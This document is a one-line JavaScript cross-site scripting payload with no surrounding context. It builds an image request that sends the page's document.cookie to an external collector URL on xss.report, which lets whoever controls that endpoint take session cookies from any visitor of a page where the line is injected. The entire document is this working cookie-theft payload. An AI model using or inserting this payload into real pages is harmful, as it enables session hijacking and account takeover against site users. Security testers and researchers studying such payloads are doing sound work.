new Image().src = 'https://xss.report/c/mon3m1?cookie=' + document.cookie;
